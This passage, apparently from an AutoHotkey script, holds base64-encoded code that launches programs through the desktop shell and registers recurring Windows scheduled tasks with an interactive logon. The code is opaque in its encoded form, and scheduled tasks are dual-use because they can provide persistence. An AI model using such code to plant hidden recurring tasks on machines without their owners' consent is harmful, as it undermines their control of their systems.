dGF0aWMgVlRfVUk0IDo9IDB4MTMsIFNXQ19ERVNLVE9QIDo9IDB4OA0KICAgc2hlbGxXaW5kb3dzIDo9IENvbU9iakNyZWF0ZSgiU2hlbGwuQXBwbGljYXRpb24iKS5XaW5kb3dzDQogICBzaGVsbCA6PSBzaGVsbFdpbmRvd3MuSXRlbSggQ29tT2JqZWN0KFZUX1VJNCwgU1dDX0RFU0tUT1ApICkuRG9jdW1lbnQuQXBwbGljYXRpb24NCiAgIHNoZWxsLlNoZWxsRXhlY3V0ZShmaWxlUGF0aCwgYXJndW1lbnRzLCBkaXJlY3RvcnksIHZlcmIsIHNob3cpDQp9DQoNCk9uQ2hpbGRNZXNzYWdlKEluZm8sIHdwKSB7DQogICBJbmZvWzFdIDo9IHdwDQp9DQoNCkNyZWF0ZVRhc2sodGFza05hbWUsIGZpbGVQYXRoLCBzQXJncywgc3RhcnRUaW1lLCBpbnRlcnZhbEhvdXJzIDo9IDAsIHN0YXJ0SW1tZWRpYXRlbHkgOj0gZmFsc2UpIHsNCiAgIGxvY2FsDQogICBzdGF0aWMgVEFTS19UUklHR0VSX0RBSUxZIDo9IDINCiAgICAgICAgLCBUQVNLX0FDVElPTl9FWEVDIDo9IDANCiAgICAgICAgLCBUQVNLX0NSRUFURV9PUl9VUERBVEUgOj0gNg0KICAgICAgICAsIFRBU0tfTE9HT05fSU5URVJBQ1RJVkVfVE9LRU4gOj0gMw0KICAgICAgICANCiAgIGlmICFSZWdFeE1hdGNoKHN0YXJ0VGltZSwgIl4oPzowfDF8KDIpKSg/KDEpWzAtM118XGQpOlswLTVdXGQkIikNCiAgICAgIHRocm93ICJ3cm9uZyBzdGFydFRpbWUgZm9ybWF0Ig0KICAgaWYgIXNlcnZpY2UgOj0gQ29tT2JqQ3JlYXRlKCJTY2hlZHVsZS5TZXJ2aWNlIikNCiAgICAgIFJldHVybiBmYWxzZQ0KICAgc2VydmljZS5Db25uZWN0KCkNCiAgIHJvb3RGb2xkZXIgOj0gc2VydmljZS5HZXRGb2xkZXIoIlwiKQ0KICAgdGFza0RlZmluaXRpb24gOj0gc2VydmljZS5OZXdUYXNrKDApDQogICANCiAgIHByaW5jaXBhbCA6PSB0YXNrRGVmaW5pdGlvbi5QcmluY2lwYWwNCiAgIHByaW5jaXBhbC5Mb2dvblR5cGUgOj0gVEFTS19MT0dPTl9JTlRFUkFDVElWRV9UT0tFTg0KICAgDQogICBzZXR0aW5ncyA6PSB0YXNrRGVmaW5pdGlvbi5TZXR0aW5ncw0KICAgc2V0dGluZ3MuRW5hYmxlZCA6PSB0cnVlDQogICBzZXR0aW5ncy5TdGFydFdoZW5BdmFpbGFibGUgOj0gdHJ1ZQ0KICAgc2V0dGluZ3MuRGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXMgOj0gZmFsc2UNCiAgIHNldHRpbmdzLlJ1bk9ubHlJZk5ldHdvcmtBdmFpbGFibGUgOj0gdHJ1ZQ0KICAgc2V0dGluZ3MuSGlkZGVuIDo9IGZhbHNlDQoNCiAgIHRyaWdnZXJzIDo9IHRhc2tEZWZpbml0aW9uLlRyaWdnZXJzDQogICB0cmlnZ2VyIDo9IHRyaWdnZXJzLkNyZWF0ZShUQVNLX1RSSUdHRVJfREFJTFkpDQogICBpZiBpbnRlcnZh"
base64 .= "bEhvdXJzIHsNCiAgICAgIHJlcGV0aXRpb24gOj0gdHJpZ2dlci5SZXBldGl0aW9uDQogICAgICByZXBldGl0aW9uLkR1cmF0aW9uIDo9ICJQMUQiDQogICAgICByZXBldGl0aW9uLkludGVydmFsIDo9ICJQVCIgLiBpbnRlcnZhbEhvdXJzIC4gIkgiDQogICB9DQogICBzdGFydFRpbWUgOj0gIjIwMjIwNjE2IiAuIFN0clJlcGxhY2Uoc3RhcnRUaW1lLCAiOiIpIC4gIjAwIg0KICAgRm9ybWF0VGltZSwgc3RhcnRUaW1lLCAlIHN0YXJ0VGltZSwgeXl5eS1NTS1kZFRISDptbTpzcw0KICAgdHJpZ2dlci5TdGFydEJvdW5kYXJ5IDo9IHN0YXJ0VGltZQ0KICAgdHJpZ2dlci5JZCA6PSAiVGltZVRyaWdnZXJJZCINCiAgIHRyaWdnZXIuRW5hYmxlZCA6PSB0cnVlDQoNCiAgIGFjdGlvbiA6PSB0YXNrRGVmaW5pdGlvbi5BY3Rpb25zLkNyZWF0ZSggVEFTS19BQ1RJT05fRVhFQyApDQogICBhY3Rpb24uUGF0aCA6PSBmaWxlUGF0aA0KICAgKHNBcmdzICE9ICIiICYmIGFjdGlvbi5Bcmd1bWVudHMgOj0gc0FyZ3MpDQogICANCiAgIHRhc2sgOj0gcm9vdEZvbGRlci5SZWdpc3RlclRhc2tEZWZpbml0aW9uKHRhc2tOYW1lLCB0YXNrRGVmaW5pdGlvbiwgVEFTS19DUkVBVEVfT1JfVVBEQVRFLCwsIFRBU0tfTE9HT05fSU5URVJBQ1RJVkVfVE9LRU4pDQogICAoIHN0YXJ0SW1tZWRpYXRlbHkgJiYgdGFzay5SdW4oIiIpICkNCiAgIFJldHVybiB0cnVlDQp9"
Return base64
}
